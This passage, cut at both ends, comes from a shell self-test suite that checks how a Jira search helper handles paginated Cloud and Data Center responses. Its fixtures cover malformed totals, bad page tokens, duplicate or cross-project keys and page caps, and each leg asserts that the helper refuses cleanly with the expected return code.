  _tj_search_all cloud AB "https://ex.atlassian.net/rest/api/3/search/jql" \
    "project = AB AND status = 3" 200 '["key"]' > "$sa_out" 2>"$tmpd/sa1.err" || sa_rc=$?
  if [ "$sa_rc" -eq 0 ] \
    && [ "$(sed -n '1p' "$sa_out")" = '{"id":"11001","key":"AB-1","fields":{}}' ] \
    && [ "$(sed -n '2p' "$sa_out")" = '{"id":"11002","key":"AB-2","fields":{}}' ] \
    && [ "$(sed -n '3p' "$sa_out")" = '{"id":"11003","key":"AB-3","fields":{}}' ] \
    && [ "$(sed -n '4p' "$sa_out")" = '{"id":"11004","key":"AB-4","fields":{}}' ] \
    && [ "$(sed -n '5p' "$sa_out")" = '{"id":"11005","key":"AB-5","fields":{}}' ] \
    && [ "$(wc -l < "$sa_out" | tr -d ' ')" -eq 5 ]; then
    echo "PASS: selftest — _tj_search_all Cloud two-page fetch returns all 5 issues, one compact object per line, in order, rc 0 (T2b1 leg 1)"
  else
    echo "FAIL: selftest — _tj_search_all Cloud two-page fetch did not return the expected 5 issues in order (rc=$sa_rc out='$(cat "$sa_out" 2>/dev/null)' err='$(cat "$tmpd/sa1.err" 2>/dev/null)')"; sfail=1
  fi

  # --- T2b1 leg 2: page 2's request carries nextPageToken in the POSTed body (.lastbody) and
  # NEVER in the url= line (.lastcfg) — S-8/F-12d, invariant 4. ---------------------------------
  _tj_fxseq list-page1 list-page2
  : > "$argvlog"
  _tj_search_all cloud AB "https://ex.atlassian.net/rest/api/3/search/jql" \
    "project = AB AND status = 3" 200 '["key"]' > "$tmpd/sa2.out" 2>"$tmpd/sa2.err" || true
  sa2_lastbody=$(cat "$tmpd/.lastbody" 2>/dev/null || true)
  sa2_lasturlline=$(grep '^url = ' "$tmpd/.lastcfg" 2>/dev/null || true)
  case "$sa2_lastbody" in
    *'"nextPageToken"'*'"CAEQAg"'*) sa2_tokinbody=1 ;;
    *) sa2_tokinbody=0 ;;
  esac
  case "$sa2_lasturlline" in
    *CAEQAg*) sa2_tokinurl=1 ;;
    *) sa2_tokinurl=0 ;;
  esac
  if [ "$sa2_tokinbody" -eq 1 ] && [ "$sa2_tokinurl" -eq 0 ]; then
    echo "PASS: selftest — page 2's nextPageToken is in the POSTed body and never in the request URL (T2b1 leg 2)"
  else
    echo "FAIL: selftest — nextPageToken placement wrong (in-body=$sa2_tokinbody in-url=$sa2_tokinurl body='$sa2_lastbody' urlline='$sa2_lasturlline')"; sfail=1
  fi

  # --- T2b1 leg 3: a key with a trailing newline ({"key":"AB-1\n\n"}) -> rc 1, file empty
  # (checked == emitted — invariant 1: a $(...) capture silently strips it, so the RAW object's
  # own key must be re-asserted equal to the checked value). -------------------------------------
  _tj_fx list-trailing-newline
  : > "$argvlog"
  sa3_rc=0
  _tj_search_all cloud AB "https://ex.atlassian.net/rest/api/3/search/jql" \
    "project = AB AND status = 3" 200 '["key"]' > "$tmpd/sa3.out" 2>"$tmpd/sa3.err" || sa3_rc=$?
  if [ "$sa3_rc" -eq 1 ] && [ ! -s "$tmpd/sa3.out" ]; then
    echo "PASS: selftest — a trailing-newline key is refused, rc 1, empty stdout (checked==emitted, T2b1 leg 3)"
  else
    echo "FAIL: selftest — trailing-newline key was not cleanly refused (rc=$sa3_rc out='$(cat "$tmpd/sa3.out" 2>/dev/null)')"; sfail=1
  fi

  # --- T2b1 leg 4: a cross-project key on the SECOND issue of page 1 -> rc 1, file empty (proves
  # the buffer: nothing from the FIRST, valid issue escapes either). ------------------------------
  _tj_fx list-crossproject
  : > "$argvlog"
  sa4_rc=0
  _tj_search_all cloud AB "https://ex.atlassian.net/rest/api/3/search/jql" \
    "project = AB AND status = 3" 200 '["key"]' > "$tmpd/sa4.out" 2>"$tmpd/sa4.err" || sa4_rc=$?
  if [ "$sa4_rc" -eq 1 ] && [ ! -s "$tmpd/sa4.out" ]; then
    echo "PASS: selftest — a cross-project key on issue 2 refuses the whole page, rc 1, empty stdout — nothing from issue 1 leaks (T2b1 leg 4)"
  else
    echo "FAIL: selftest — cross-project key on issue 2 was not cleanly refused (rc=$sa4_rc out='$(cat "$tmpd/sa4.out" 2>/dev/null)')"; sfail=1
  fi

  # --- T2b1 leg 5: a key repeated across pages -> rc 1, file empty (F-6 — never dedup-and-bind).
  _tj_fxseq list-page1 list-dupkey
  : > "$argvlog"
  sa5_rc=0
  _tj_search_all cloud AB "https://ex.atlassian.net/rest/api/3/search/jql" \
    "project = AB AND status = 3" 200 '["key"]' > "$tmpd/sa5.out" 2>"$tmpd/sa5.err" || sa5_rc=$?
  if [ "$sa5_rc" -eq 1 ] && [ ! -s "$tmpd/sa5.out" ]; then
    echo "PASS: selftest — a key repeated across pages refuses the whole read, rc 1, empty stdout (T2b1 leg 5)"
  else
    echo "FAIL: selftest — a cross-page duplicate key was not refused (rc=$sa5_rc out='$(cat "$tmpd/sa5.out" 2>/dev/null)')"; sfail=1
  fi

  # --- T2b1 leg 6a: `.issues` missing entirely -> rc 2, file empty (invariant 3, every shape
  # is asserted, never assumed). -----------------------------------------------------------------
  _tj_fx list-missing-issues
  : > "$argvlog"
  sa6a_rc=0
  _tj_search_all cloud AB "https://ex.atlassian.net/rest/api/3/search/jql" \
    "project = AB AND status = 3" 200 '["key"]' > "$tmpd/sa6a.out" 2>"$tmpd/sa6a.err" || sa6a_rc=$?
  if [ "$sa6a_rc" -eq 2 ] && [ ! -s "$tmpd/sa6a.out" ]; then
    echo "PASS: selftest — a response with no 'issues' field yields unverified, rc 2, empty stdout (T2b1 leg 6a)"
  else
    echo "FAIL: selftest — a missing 'issues' field did not yield rc 2/empty (rc=$sa6a_rc out='$(cat "$tmpd/sa6a.out" 2>/dev/null)')"; sfail=1
  fi

  # --- T2b1 leg 6b: `.issues` present but an OBJECT, not an array -> rc 2, file empty. ----------
  _tj_fx list-object-issues
  : > "$argvlog"
  sa6b_rc=0
  _tj_search_all cloud AB "https://ex.atlassian.net/rest/api/3/search/jql" \
    "project = AB AND status = 3" 200 '["key"]' > "$tmpd/sa6b.out" 2>"$tmpd/sa6b.err" || sa6b_rc=$?
  if [ "$sa6b_rc" -eq 2 ] && [ ! -s "$tmpd/sa6b.out" ]; then
    echo "PASS: selftest — an 'issues' object (not an array) yields unverified, rc 2, empty stdout (T2b1 leg 6b)"
  else
    echo "FAIL: selftest — a non-array 'issues' did not yield rc 2/empty (rc=$sa6b_rc out='$(cat "$tmpd/sa6b.out" 2>/dev/null)')"; sfail=1
  fi

  # --- T2b1 leg 6c: a `null` key -> rc 1, file empty (the per-key grammar check catches it, since
  # `has("key")` is true for an explicit null — distinguishes it from leg 7's MISSING key). -------
  _tj_fx list-nullkey
  : > "$argvlog"
  sa6c_rc=0
  _tj_search_all cloud AB "https://ex.atlassian.net/rest/api/3/search/jql" \
    "project = AB AND status = 3" 200 '["key"]' > "$tmpd/sa6c.out" 2>"$tmpd/sa6c.err" || sa6c_rc=$?
  if [ "$sa6c_rc" -eq 1 ] && [ ! -s "$tmpd/sa6c.out" ]; then
    echo "PASS: selftest — a null key is refused, rc 1, empty stdout (T2b1 leg 6c)"
  else
    echo "FAIL: selftest — a null key was not cleanly refused (rc=$sa6c_rc out='$(cat "$tmpd/sa6c.out" 2>/dev/null)')"; sfail=1
  fi

  # --- T2b1 leg 7: a page whose `.issues` holds an element with NO `key` field at all, beside a
  # valid one -> refused (rc 1), file empty. The per-key check must NOT be what catches this (it
  # never even sees the candidate — `select(has("key"))` drops it first); only a length check,
  # comparing `.issues|length` against the count of key-bearing candidates, can. ------------------
  _tj_fx list-nokey
  : > "$argvlog"
  sa7_rc=0
  _tj_search_all cloud AB "https://ex.atlassian.net/rest/api/3/search/jql" \
    "project = AB AND status = 3" 200 '["key"]' > "$tmpd/sa7.out" 2>"$tmpd/sa7.err" || sa7_rc=$?
  if [ "$sa7_rc" -eq 1 ] && [ ! -s "$tmpd/sa7.out" ]; then
    echo "PASS: selftest — an issue with no 'key' field beside a valid one is refused, rc 1, empty stdout (T2b1 leg 7)"
  else
    echo "FAIL: selftest — a missing-key issue beside a valid one was not refused (rc=$sa7_rc out='$(cat "$tmpd/sa7.out" 2>/dev/null)')"; sfail=1
  fi

  # --- T2b1 leg 8: accumulated ids reach the cap EXACTLY on a complete page -> rc 2 'list
  # truncated', even though isLast is true; cap-1 (one short of the total) -> rc 0. ----------------
  _tj_fx list-cap-exact
  : > "$argvlog"
  sa8a_rc=0
  _tj_search_all cloud AB "https://ex.atlassian.net/rest/api/3/search/jql" \
    "project = AB AND status = 3" 3 '["key"]' > "$tmpd/sa8a.out" 2>"$tmpd/sa8a.err" || sa8a_rc=$?
  sa8a_ok=0
  [ "$sa8a_rc" -eq 2 ] && [ ! -s "$tmpd/sa8a.out" ] && sa8a_ok=1
  _tj_fx list-cap-exact
  : > "$argvlog"
  sa8b_rc=0
  _tj_search_all cloud AB "https://ex.atlassian.net/rest/api/3/search/jql" \
    "project = AB AND status = 3" 4 '["key"]' > "$tmpd/sa8b.out" 2>"$tmpd/sa8b.err" || sa8b_rc=$?
  sa8b_ok=0
  [ "$sa8b_rc" -eq 0 ] && [ "$(wc -l < "$tmpd/sa8b.out" | tr -d ' ')" -eq 3 ] && sa8b_ok=1
  if [ "$sa8a_ok" -eq 1 ] && [ "$sa8b_ok" -eq 1 ]; then
    echo "PASS: selftest — cap reached exactly on a complete page refuses (rc 2); cap one higher than the total succeeds (rc 0) (T2b1 leg 8)"
  else
    echo "FAIL: selftest — cap-exact truncation did not behave as expected (cap=3 rc=$sa8a_rc out='$(cat "$tmpd/sa8a.out" 2>/dev/null)'; cap=4 rc=$sa8b_rc out='$(cat "$tmpd/sa8b.out" 2>/dev/null)')"; sfail=1
  fi

  # --- T2b1 leg 9 (fix1 I-3 rewrite): a page carrying MORE issues than the requested maxResults
  # -> rc 2, empty file — cap=200 and ONE isLast:true page of 101 issues, so the running-total cap
  # check (101 < 200) CANNOT catch it; only a dedicated maxResults-vs-page-size check can. The old
  # leg used cap=3 against a 4-issue page, where the cap check alone already refused it — it never
  # exercised its own named rule. ------------------------------------------------------------------
  _tj_fx list-over-max-101
  : > "$argvlog"
  sa9_rc=0
  _tj_search_all cloud AB "https://ex.atlassian.net/rest/api/3/search/jql" \
    "project = AB AND status = 3" 200 '["key"]' > "$tmpd/sa9.out" 2>"$tmpd/sa9.err" || sa9_rc=$?
  if [ "$sa9_rc" -eq 2 ] && [ ! -s "$tmpd/sa9.out" ]; then
    echo "PASS: selftest — a page carrying more issues (101) than the requested maxResults (100) is refused, rc 2, empty stdout, even though the cap (200) is nowhere near reached (T2b1 leg 9)"
  else
    echo "FAIL: selftest — a page over maxResults was not refused (rc=$sa9_rc out='$(wc -l < "$tmpd/sa9.out" 2>/dev/null | tr -d ' ')' lines)"; sfail=1
  fi

  # --- T2b1 leg 10a: isLast:true WITH a nextPageToken -> rc 2 (an invalid combination — Cloud
  # completeness is ONLY isLast==true AND nextPageToken==null). ----------------------------------
  _tj_fx list-islast-true-with-token
  : > "$argvlog"
  sa10a_rc=0
  _tj_search_all cloud AB "https://ex.atlassian.net/rest/api/3/search/jql" \
    "project = AB AND status = 3" 200 '["key"]' > "$tmpd/sa10a.out" 2>"$tmpd/sa10a.err" || sa10a_rc=$?
  if [ "$sa10a_rc" -eq 2 ] && [ ! -s "$tmpd/sa10a.out" ]; then
    echo "PASS: selftest — isLast:true WITH a nextPageToken is refused, rc 2, empty stdout (T2b1 leg 10a)"
  else
    echo "FAIL: selftest — isLast:true with a token was not refused (rc=$sa10a_rc out='$(cat "$tmpd/sa10a.out" 2>/dev/null)')"; sfail=1
  fi

  # --- T2b1 leg 10b: isLast:false with NO/empty nextPageToken -> rc 2 AND no second request
  # (the argv log shows exactly one curl call). --------------------------------------------------
  _tj_fx list-islast-false-no-token
  : > "$argvlog"
  sa10b_rc=0
  _tj_search_all cloud AB "https://ex.atlassian.net/rest/api/3/search/jql" \
    "project = AB AND status = 3" 200 '["key"]' > "$tmpd/sa10b.out" 2>"$tmpd/sa10b.err" || sa10b_rc=$?
  sa10b_calls=$(grep -c '^' "$argvlog" 2>/dev/null || echo 0)
  if [ "$sa10b_rc" -eq 2 ] && [ ! -s "$tmpd/sa10b.out" ] && [ "$sa10b_calls" -eq 1 ]; then
    echo "PASS: selftest — isLast:false with no token is refused, rc 2, empty stdout, exactly one request (T2b1 leg 10b)"
  else
    echo "FAIL: selftest — isLast:false with no token was not cleanly refused (rc=$sa10b_rc calls=$sa10b_calls out='$(cat "$tmpd/sa10b.out" 2>/dev/null)')"; sfail=1
  fi

  # --- T2b1 leg 10c: `isLast` absent entirely -> rc 2. --------------------------------------------
  _tj_fx list-missing-islast
  : > "$argvlog"
  sa10c_rc=0
  _tj_search_all cloud AB "https://ex.atlassian.net/rest/api/3/search/jql" \
    "project = AB AND status = 3" 200 '["key"]' > "$tmpd/sa10c.out" 2>"$tmpd/sa10c.err" || sa10c_rc=$?
  if [ "$sa10c_rc" -eq 2 ] && [ ! -s "$tmpd/sa10c.out" ]; then
    echo "PASS: selftest — a response with no 'isLast' field is refused, rc 2, empty stdout (T2b1 leg 10c)"
  else
    echo "FAIL: selftest — a missing 'isLast' field was not refused (rc=$sa10c_rc out='$(cat "$tmpd/sa10c.out" 2>/dev/null)')"; sfail=1
  fi

  # --- T2b1 leg 10d: the page budget exhausted -> rc 2 (two never-complete pages, cap=101 so
  # max stays pinned at 100 and budget = 101/100 + 1 = 2; a third page is never fetched). ----------
  _tj_fxseq list-page1 list-continues
  : > "$argvlog"
  sa10d_rc=0
  _tj_search_all cloud AB "https://ex.atlassian.net/rest/api/3/search/jql" \
    "project = AB AND status = 3" 101 '["key"]' > "$tmpd/sa10d.out" 2>"$tmpd/sa10d.err" || sa10d_rc=$?
  sa10d_calls=$(grep -c '^' "$argvlog" 2>/dev/null || echo 0)
  if [ "$sa10d_rc" -eq 2 ] && [ ! -s "$tmpd/sa10d.out" ] && [ "$sa10d_calls" -eq 2 ]; then
    echo "PASS: selftest — the page budget exhausted refuses, rc 2, empty stdout, no third request (T2b1 leg 10d)"
  else
    echo "FAIL: selftest — page budget exhaustion did not behave as expected (rc=$sa10d_rc calls=$sa10d_calls out='$(cat "$tmpd/sa10d.out" 2>/dev/null)')"; sfail=1
  fi

  # --- T2b1 leg 11: a bad cap (0/007/123456) or a bad project (ab/../x) -> rc 1 before any
  # request (invariant 5, grammar-gated before any request). ---------------------------------------
  leg11ok=1
  for badcap in 0 007 123456; do
    _tj_fx list-page1
    : > "$argvlog"
    rc=0
    _tj_search_all cloud AB "https://ex.atlassian.net/rest/api/3/search/jql" \
      "project = AB AND status = 3" "$badcap" '["key"]' > "$tmpd/sa11.out" 2>"$tmpd/sa11.err" || rc=$?
    [ "$rc" -eq 1 ] && [ ! -s "$tmpd/sa11.out" ] && [ ! -s "$argvlog" ] || { leg11ok=0; echo "  (cap='$badcap' rc=$rc argvlog-size=$(wc -c < "$argvlog" | tr -d ' '))" >&2; }
  done
  _tj_fx list-page1
  : > "$argvlog"
  rc=0
  _tj_search_all cloud 'ab/../x' "https://ex.atlassian.net/rest/api/3/search/jql" \
    "project = AB AND status = 3" 200 '["key"]' > "$tmpd/sa11b.out" 2>"$tmpd/sa11b.err" || rc=$?
  [ "$rc" -eq 1 ] && [ ! -s "$tmpd/sa11b.out" ] && [ ! -s "$argvlog" ] || leg11ok=0
  # T2b1 leg 12 (the `datacenter` -> pinned "not implemented" placeholder) is RETIRED here — T2b2
  # DC leg 1, above, is its real replacement (deleted only once that leg was confirmed green).

  # --- T2b2 fix2 Q-I1: an UNKNOWN flavour (neither 'cloud' nor 'datacenter') is refused BEFORE any
  # request, rc 1, empty stdout, empty argvlog, and the fixed sentence on stderr. --------------------
  _tj_fx dc-list-page1
  : > "$argvlog"
  qi1_rc=0
  _tj_search_all jira AB "https://ex.example.com/rest/api/2/search" \
    "project = AB AND status = 3" 200 '["key"]' > "$tmpd/qi1.out" 2>"$tmpd/qi1.err" || qi1_rc=$?
  if [ "$qi1_rc" -eq 1 ] && [ ! -s "$tmpd/qi1.out" ] && [ ! -s "$argvlog" ] \
    && grep -q "flavour must be" "$tmpd/qi1.err"; then
    echo "PASS: selftest — an unknown flavour ('jira') refuses, rc 1, empty stdout, no request, stderr names the flavour rule (T2b2 fix2 Q-I1)"
  else
    echo "FAIL: selftest — an unknown flavour was not cleanly refused (rc=$qi1_rc argvlog-size=$(wc -c < "$argvlog" | tr -d ' ') out='$(cat "$tmpd/qi1.out" 2>/dev/null)' err='$(cat "$tmpd/qi1.err" 2>/dev/null)')"; sfail=1
  fi

}
_tj_st_search_dc() {

  # --- T2b2 DC leg 1: Data Center, two REAL pages (startAt 0/maxResults 3/total 5, then startAt
  # 3/total 5) -> rc 0, all 5 issues in order; page 2's POSTed body has `startAt == 3` (not a
  # `nextPageToken`) and the URL is exactly whatever DC url the caller passed (no Cloud-only
  # /search/jql rewriting). A non-empty argvlog after each fetch proves a REAL request was
  # dispatched — distinguishing this from the old blanket "not implemented" placeholder, which
  # never dispatched anything at all. ------------------------------------------------------------
  _tj_fxseq dc-list-page1 dc-list-page2
  : > "$argvlog"
  dc1_rc=0
  _tj_search_all datacenter AB "https://ex.example.com/rest/api/2/search" \
    "project = AB AND status = 3" 200 '["key"]' > "$tmpd/dc1.out" 2>"$tmpd/dc1.err" || dc1_rc=$?
  dc1_keys=$(jq -r '.key' < "$tmpd/dc1.out" 2>/dev/null | tr '\n' ',' )
  dc1_lastbody=$(cat "$tmpd/.lastbody" 2>/dev/null || true)
  dc1_lasturl=$(cat "$tmpd/.lasturl" 2>/dev/null || true)
  dc1_reqs=$(wc -l < "$argvlog" | tr -d ' ')
  case "$dc1_lastbody" in
    *'"startAt"'*':'*'3'*) dc1_bodyok=1 ;;
    *) dc1_bodyok=0 ;;
  esac
  if [ "$dc1_rc" -eq 0 ] && [ "$dc1_keys" = "AB-1,AB-2,AB-3,AB-4,AB-5," ] && [ "$dc1_reqs" -eq 2 ] \
    && [ "$dc1_bodyok" -eq 1 ] && [ "$dc1_lasturl" = "https://ex.example.com/rest/api/2/search" ]; then
    echo "PASS: selftest — Data Center two-page fetch returns all 5 issues in order, rc 0, page 2's body carries startAt==3, the DC URL is preserved (T2b2 DC leg 1)"
  else
    echo "FAIL: selftest — Data Center two-page fetch did not behave as expected (rc=$dc1_rc keys='$dc1_keys' reqs=$dc1_reqs bodyok=$dc1_bodyok url='$dc1_lasturl' body='$dc1_lastbody' err='$(cat "$tmpd/dc1.err" 2>/dev/null)')"; sfail=1
  fi

  # --- M-G2: `_tj_sa_page_status_dc`'s OWN requested-startAt digit grammar, called directly (the
  # loop above only ever hands it a genuine integer counter; no existing leg feeds it a malformed
  # value) — a well-formed body with a malformed reqstart ('x', '1x', empty) must refuse, rc 1,
  # no output, before any arithmetic runs.
  g2_body='{"total":5,"issues":[{},{},{}]}'
  for g2_reqstart in x 1x ''; do
    g2_rc=0
    g2_out=$(_tj_sa_page_status_dc "$g2_body" "$g2_reqstart" 2>"$tmpd/g2.err") || g2_rc=$?
    if [ "$g2_rc" -eq 1 ] && [ -z "$g2_out" ]; then
      echo "PASS: selftest — _tj_sa_page_status_dc refuses a malformed requested-startAt ('$g2_reqstart'), rc 1, no output (M-G2)"
    else
      echo "FAIL: selftest — _tj_sa_page_status_dc did not refuse a malformed requested-startAt ('$g2_reqstart') (rc=$g2_rc out='$g2_out')"; sfail=1
    fi
  done

  # --- T2b2 DC leg 2: `total` absent from the DC response -> rc 2, empty stdout — cannot prove
  # completeness at all without it (the same fail-closed rule as Cloud's absent `isLast`). A
  # non-empty argvlog proves a real request WAS dispatched (never the old placeholder). ------------
  _tj_fx dc-list-no-total
  : > "$argvlog"
  dc2_rc=0
  _tj_search_all datacenter AB "https://ex.example.com/rest/api/2/search" \
    "project = AB AND status = 3" 200 '["key"]' > "$tmpd/dc2.out" 2>"$tmpd/dc2.err" || dc2_rc=$?
  dc2_reqs=$(wc -l < "$argvlog" | tr -d ' ')
  if [ "$dc2_rc" -eq 2 ] && [ ! -s "$tmpd/dc2.out" ] && [ "$dc2_reqs" -eq 1 ]; then
    echo "PASS: selftest — Data Center 'total' absent yields rc 2, empty stdout, one real request (T2b2 DC leg 2)"
  else
    echo "FAIL: selftest — Data Center 'total' absent was not cleanly refused (rc=$dc2_rc reqs=$dc2_reqs out='$(cat "$tmpd/dc2.out" 2>/dev/null)' err='$(cat "$tmpd/dc2.err" 2>/dev/null)')"; sfail=1
  fi

  # --- T2b2 fix1 m-1: `total`'s own JSON TYPE was never grammar-checked, only its `jq -r`
  # stringification — a JSON STRING `"5"` stringifies IDENTICALLY to the number 5, so it silently
  # passed the old digits-only shell `case` check and drove real completeness arithmetic. A JSON
  # `null`/negative/fractional `total` already stringifies to something the digits-only check
  # rejects (proved independently below via jq before touching the fix), so only the string case
  # was the live defect — every value here must refuse (rc 2, empty stdout, one real request). -----
  for m1_fix in total-string total-null total-negative total-fraction; do
    _tj_fx "dc-list-$m1_fix"
    : > "$argvlog"
    m1_rc=0
    _tj_search_all datacenter AB "https://ex.example.com/rest/api/2/search" \
      "project = AB AND status = 3" 200 '["key"]' > "$tmpd/m1.out" 2>"$tmpd/m1.err" || m1_rc=$?
    m1_reqs=$(wc -l < "$argvlog" | tr -d ' ')
    m1_stderrok=1
    grep -q "unverified: list truncated (page not complete)" "$tmpd/m1.err" || m1_stderrok=0
    grep -qE "Illegal number|integer expression|jq: error" "$tmpd/m1.err" && m1_stderrok=0
    if [ "$m1_rc" -eq 2 ] && [ ! -s "$tmpd/m1.out" ] && [ "$m1_reqs" -eq 1 ] && [ "$m1_stderrok" -eq 1 ]; then
      echo "PASS: selftest — Data Center 'total' of the wrong JSON type/value ($m1_fix) is refused, rc 2, empty stdout, one real request, clean stderr (T2b2 fix1 m-1)"
    else
      echo "FAIL: selftest — Data Center 'total' of the wrong JSON type/value ($m1_fix) was not refused (rc=$m1_rc reqs=$m1_reqs stderrok=$m1_stderrok out='$(cat "$tmpd/m1.out" 2>/dev/null)' err='$(cat "$tmpd/m1.err" 2>/dev/null)')"; sfail=1
    fi
  done

  # --- T2b2 fix1 m-1b: a STRING `total` that is otherwise NUMERICALLY COHERENT with the page it
  # accompanies (`"1"` alongside exactly 1 real issue, startAt 0 — next==total if the type were
  # ignored) must STILL be refused on its TYPE alone, one real request. This isolates the type
  # check from m-1's own leg above, whose fixture (an empty page) is ALSO independently caught by
  # m-5's later no-progress guard — a coherent page rules that mask out, so a mutant that re-widens
  # the type check to accept a string is caught HERE specifically, not by accident elsewhere. -------
  _tj_fx dc-list-total-string-coherent
  : > "$argvlog"
  m1b_rc=0
  _tj_search_all datacenter AB "https://ex.example.com/rest/api/2/search" \
    "project = AB AND status = 3" 200 '["key"]' > "$tmpd/m1b.out" 2>"$tmpd/m1b.err" || m1b_rc=$?
  m1b_reqs=$(wc -l < "$argvlog" | tr -d ' ')
  m1b_stderrok=1
  grep -q "unverified: list truncated (page not complete)" "$tmpd/m1b.err" || m1b_stderrok=0
  grep -qE "Illegal number|integer expression|jq: error" "$tmpd/m1b.err" && m1b_stderrok=0
  if [ "$m1b_rc" -eq 2 ] && [ ! -s "$tmpd/m1b.out" ] && [ "$m1b_reqs" -eq 1 ] && [ "$m1b_stderrok" -eq 1 ]; then
    echo "PASS: selftest — Data Center: a numerically-coherent STRING total is still refused on its type alone, rc 2, empty stdout, one real request, clean stderr (T2b2 fix1 m-1b)"
  else
    echo "FAIL: selftest — Data Center: a numerically-coherent STRING total was not refused (rc=$m1b_rc reqs=$m1b_reqs stderrok=$m1b_stderrok out='$(cat "$tmpd/m1b.out" 2>/dev/null)' err='$(cat "$tmpd/m1b.err" 2>/dev/null)')"; sfail=1
  fi

  # --- T2b2 fix2 S-M1 + Q-m2 (security Medium): a DC 'total' that PASSES the typed check (a genuine
  # non-negative JSON integer) but is spelled in an odd numeric FORM (a trailing '.0', scientific
  # notation, or a value too large to be a safe integer) must still refuse CLEANLY — never leak a raw
  # shell/jq diagnostic (which could echo tracker-controlled bytes) onto stderr. Each fixture uses an
  # EMPTY page (0 issues, matching the m-1/m-1b convention above) so refusal is deterministic and
  # ONE-REQUEST regardless of the total's magnitude (a non-empty page would need issue counts in the
  # hundreds to force incoherence for the larger values, colliding with the fixed 100-issue-per-page
  # ceiling — disclosed in the evidence log rather than following the brief's literal "3 issues"
  # illustration unmodified). `2p53` (total: 2^53, one past the safe-integer bound) additionally
  # isolates the `<= 9007199254740991` bound check on its own: its `floor|tostring` still renders as
  # a plain 16-digit string (within the digit-gate/length-bound's own reach), so ONLY the explicit
  # numeric bound — not the other two defence-in-depth layers — can catch it (found while proving
  # the "drop the bound" required mutant below; the other six fixtures alone left that mutant GREEN,
  # since jq's own scientific-notation threshold is far above 2^53 and the digit-gate/length-bound
  # already reject THEIR string forms independently). `negzero` (total: -0.0) isolates the
  # extracted-value DIGIT-GATE on its own: it passes type/non-negativity/integer-valuedness/bound
  # (IEEE754 -0.0 >= 0 is true) and `floor|tostring` renders it as the 2-byte string "-0" — a
  # non-digit ('-') that ONLY the digit-gate (not the bound, not the length check) rejects; without
  # it, shell `-eq` treats "-0" as numerically equal to 0, and an empty (0-issue) page would be
  # wrongly reported "done" (rc 0) instead of refused. ------------------------------------------------
  for smq_fix in 5dot0 2dot0 1e1 1E2 1e100 1e300 huge20 2p53 negzero; do
    _tj_fx "dc-list-total-$smq_fix"
    : > "$argvlog"
    smq_rc=0
    _tj_search_all datacenter AB "https://ex.example.com/rest/api/2/search" \
      "project = AB AND status = 3" 200 '["key"]' > "$tmpd/smq.out" 2>"$tmpd/smq.err" || smq_rc=$?
    smq_reqs=$(wc -l < "$argvlog" | tr -d ' ')
    smq_stderrok=1
    grep -q "unverified: list truncated (page not complete)" "$tmpd/smq.err" || smq_stderrok=0
    grep -qE "Illegal number|integer expression|jq: error" "$tmpd/smq.err" && smq_stderrok=0
    if [ "$smq_rc" -eq 2 ] && [ ! -s "$tmpd/smq.out" ] && [ "$smq_reqs" -eq 1 ] && [ "$smq_stderrok" -eq 1 ]; then
      echo "PASS: selftest — Data Center 'total' in an odd numeric form ($smq_fix) refuses cleanly, rc 2, empty stdout, one real request, no leaked shell/jq diagnostic (T2b2 fix2 S-M1/Q-m2)"
    else
      echo "FAIL: selftest — Data Center 'total' in an odd numeric form ($smq_fix) leaked a diagnostic or misbehaved (rc=$smq_rc reqs=$smq_reqs stderrok=$smq_stderrok out='$(cat "$tmpd/smq.out" 2>/dev/null)' err='$(cat "$tmpd/smq.err" 2>/dev/null)')"; sfail=1
    fi
  done

  # --- T2b2 fix1 m-2: an INCOHERENT DC page — more issues than the server's own claimed `total` —
  # must never be silently accepted as "done" just because `next >= total`. `total: 1` with 3
  # issues at `startAt 0` (next=3 > total=1) and `total: 0` with 2 issues (next=2 > total=0) both
  # refuse (rc 2, empty stdout, one real request); `next == total` is the ONLY genuine completion. -
  for m2i_fix in total1-issues3 total0-issues; do
    _tj_fx "dc-list-$m2i_fix"
    : > "$argvlog"
    m2i_rc=0
    _tj_search_all datacenter AB "https://ex.example.com/rest/api/2/search" \
      "project = AB AND status = 3" 200 '["key"]' > "$tmpd/m2i.out" 2>"$tmpd/m2i.err" || m2i_rc=$?
    m2i_reqs=$(wc -l < "$argvlog" | tr -d ' ')
    if [ "$m2i_rc" -eq 2 ] && [ ! -s "$tmpd/m2i.out" ] && [ "$m2i_reqs" -eq 1 ]; then
      echo "PASS: selftest — Data Center: an incoherent page (more issues than the server's own claimed total, $m2i_fix) is refused, rc 2, empty stdout, one real request (T2b2 fix1 m-2)"
    else
      echo "FAIL: selftest — Data Center: an incoherent page ($m2i_fix) was not refused (rc=$m2i_rc reqs=$m2i_reqs out='$(cat "$tmpd/m2i.out" 2>/dev/null)' err='$(cat "$tmpd/m2i.err" 2>/dev/null)')"; sfail=1
    fi
  done

  # --- T2b2 fix1 m-3: the Cloud `nextPageToken` charset (`[A-Za-z0-9+/=_.-]`) was narrower than an
  # OPAQUE token is entitled to be — Jira's own token is an implementation detail this file must
  # never assume a shape for beyond "safe to carry" (printable, no control bytes, no whitespace). A
  # token containing `~` and `!` must round-trip BYTE-IDENTICALLY into page 2's own POSTed body. ----
  _tj_fxseq list-page1-tilde-bang-token list-page2
  : > "$argvlog"
  m3_rc=0
  _tj_search_all cloud AB "https://ex.atlassian.net/rest/api/3/search/jql" \
    "project = AB AND status = 3" 200 '["key"]' > "$tmpd/m3.out" 2>"$tmpd/m3.err" || m3_rc=$?
  m3_lastbody=$(cat "$tmpd/.lastbody" 2>/dev/null || true)
  m3_tok=$(printf '%s' "$m3_lastbody" | jq -r '.nextPageToken' 2>/dev/null || true)
  if [ "$m3_rc" -eq 0 ] && [ "$m3_tok" = "AB~!12" ]; then
    echo "PASS: selftest — a page token carrying '~' and '!' (widened printable-ASCII charset) round-trips byte-identically into page 2's body, rc 0 (T2b2 fix1 m-3)"
  else
    echo "FAIL: selftest — a page token carrying '~' and '!' did not round-trip (rc=$m3_rc tok='$m3_tok' out='$(cat "$tmpd/m3.out" 2>/dev/null)' err='$(cat "$tmpd/m3.err" 2>/dev/null)')"; sfail=1
  fi

  # --- T2b2 fix1 m-5: an EMPTY DC page (`issues: []`) with `total > startAt` makes NO PROGRESS —
  # `next == reqstart` forever — and must refuse (rc 2) on the FIRST such page, one real request,
  # never loop all the way to the page budget on a server that keeps claiming more exist but never
  # sends any. -----------------------------------------------------------------------------------
  _tj_fx dc-list-empty-page
  : > "$argvlog"
  m5_rc=0
  _tj_search_all datacenter AB "https://ex.example.com/rest/api/2/search" \
    "project = AB AND status = 3" 200 '["key"]' > "$tmpd/m5.out" 2>"$tmpd/m5.err" || m5_rc=$?
  m5_reqs=$(wc -l < "$argvlog" | tr -d ' ')
